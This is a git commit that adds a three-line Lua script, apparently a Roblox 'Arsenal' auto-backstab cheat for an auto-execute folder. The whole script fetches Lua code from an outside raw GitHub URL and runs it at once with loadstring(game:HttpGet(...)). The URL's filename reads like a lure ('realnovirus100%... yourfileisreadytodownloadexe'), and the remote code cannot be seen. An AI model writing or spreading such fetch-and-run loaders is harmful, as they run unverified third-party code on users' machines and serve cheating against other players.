232fea75e0213777f327159365b0b3d1e1934585
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 13:02:28 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Arsenal Auto Back stabs.lua
@@ -0,0 +1,3 @@
+if not game:IsLoaded() then game.Loaded:Wait() end
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iqvf/script/main/arsenalautoexecfarmrealnovirus100%25windows11download_yourfileisreadytodownloadexe.lua"))()
